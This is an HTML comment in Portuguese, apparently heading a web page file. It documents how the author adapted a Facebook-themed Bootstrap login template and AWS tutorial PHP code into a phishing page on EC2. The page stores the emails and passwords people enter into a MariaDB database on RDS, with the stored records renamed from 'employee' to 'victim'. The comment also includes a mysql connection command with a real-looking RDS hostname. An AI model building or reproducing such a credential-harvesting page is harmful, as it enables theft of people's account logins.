

<!-- fonte css e formulario facebook: https://www.tutorialrepublic.com/snippets/preview.php?topic=bootstrap&file=facebook-theme-login-form botão direito / exibir codigo fonte do frame 

fonte php:
https://docs.aws.amazon.com/pt_br/AmazonRDS/latest/UserGuide/CHAP_Tutorials.WebServerDB.CreateWebServer.html

há cerca de dois anos atrás, em 2021, peguei esse código com o fernando mercês, em curso aws na alura. Provável que esse código ele pegou no site também. Então tive de relembrar as adaptações e dar uma melhorada mesmo no que fiz há dois anos.


Este código está dividido em 3 partes: 
-na tag style temos o css;
-dentro da tag body, na primeira div, temos o código de formulário do facebook;
-dentro da tag body, na segunda div, temos o código php que salva os dados na base de dados.

esse código foi focado em AWS, para uma ec2 em rede pública (este arquivo em /var/www/html e o arquivo de conexão com o banco em /var/www/cadastro), conectando em um rds com mariadb em rede privada. Mais informações em "documentacao apoio aws banco dados ec2 mariadb". Mas talvez funcione local também.

a base tarrafa criei acessando o rds através do ec2 (mysql -h dumbase2.c1ucsq6uqdba.us-west-1.rds.amazonaws.com -P 3306 -u admin -p) com o comando create databese tarrafa.

customizações que fiz no php da aws:
-coloquei o php na segunda tag div;
-substituí tudo (respeitando o que é maiúsculo do que é minúscolo, e nos comentários, nomes de variáveis, que começavam com letra maíscula, e plurais): name por email, address por password, employee(s) por victim;
-no php include, adaptei para "../connect/dbinfo.connect"
-no form template do facebook, nas tags input incluí os parâmetros name="EMAIL" e name="PASSWORD";
-removi o form que veio dentro, já que o form template do facebook (que está na primeira div) já provê isso;
-também removi os tr e o select que mostrava na página os dados cadastrados;
-talvez ainda há coisas que possam ser removidas desse código, já que o objetivo inicial dele é mostrar os dados em uma página, e eu estou usando-os apenas para salvar os dados na base


-->
